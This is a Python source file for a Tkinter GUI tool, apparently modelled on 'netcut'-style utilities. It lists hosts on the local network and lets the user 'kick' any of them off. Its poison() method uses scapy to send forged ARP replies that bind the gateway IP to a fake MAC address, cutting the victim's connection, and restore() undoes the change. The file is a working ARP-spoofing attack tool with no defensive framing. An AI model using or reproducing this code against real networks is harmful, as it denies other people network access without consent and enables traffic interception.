# client.py
# client from a listing in nbtscan

from tkinter import *
from button import CButton
from tkinter import messagebox
from scapy.all import *
import netifaces

class Client:
	def __init__(self, parent, x, y, hostname, mac=None, kicked=False, datboi_mac=None):
		self.hostname = hostname
		self.mac_addr = mac

		self.kicked = kicked
		
		if not self.kicked:
			self.graphic = PhotoImage(file="assets/device.png")
		else:
			self.graphic = PhotoImage(file="assets/devicekicked.png")
		
		self.parent = parent 

		if not self.kicked:
			self.button = CButton(self.parent, x, y, lambda: self.poison(hostname, self.mac_addr, netifaces.gateways()['default'][netifaces.AF_INET][0][0]))
		else:
			self.button = CButton(self.parent, x, y, lambda: self.restore(hostname, self.mac_addr, netifaces.gateways()['default'][netifaces.AF_INET][0][0], datboi_mac))

		self.button.set_image(self.graphic)

		self.text_id = parent.create_text(x + 32, y + 3, fill="#FFFFFF", anchor="nw", text=hostname, font=("assets/Roboto-Regular.ttf", 12, "normal"))

	def click(self, x, y):
		return self.button.click(x, y)

	def get_button(self):
		return self.button

	def get_kicked(self):
		return self.kicked

	def clear(self):
		self.button.clear()
		self.button = None
		self.parent.delete(self.text_id)
	
	def get_mac(self):
		return self.mac_addr

	def get_tag(self):
		return self.text_id

	def poison(self, victim_ip, victim_mac, gateway_ip):
		# Send the victim an ARP packet pairing 
		#the gateway ip with the wrong mac address
		self.kicked = True
		packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
		send(packet, realtime=True, verbose=0)
		print("POCKET SAND")

	# Cannot restore unless hotspot is NOT running!
	def restore(self, victim_ip, victim_mac, gateway_ip, gateway_mac):
		# Send the victim an ARP packet pairing 
		#the gateway ip with the correct mac address
		packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
		send(packet, realtime=True, verbose=0)
		print("Fixed")
		self.kicked = False